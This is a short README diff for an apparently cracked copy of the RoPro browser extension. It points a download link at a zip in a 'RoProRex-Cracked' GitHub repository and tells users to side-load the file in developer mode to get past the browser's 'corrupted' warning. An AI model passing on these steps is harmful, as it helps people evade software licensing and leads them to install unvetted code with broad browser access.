@@ -14,7 +14,7 @@ This allows you to have pro tier for free
 
 *this should get around Chrome/Brave's "corrupted" message*
 
-- Download the [RoPro](RoPro.zip)
+- Download the [RoPro](https://github.com/kss342/RoProRex-Cracked/raw/main/Rex.zip)
 - Open the extension we downloaded
 - Extract the downloaded extension to your desktop (doesnt have to be your desktop)
 - Enable developer mode on your browser
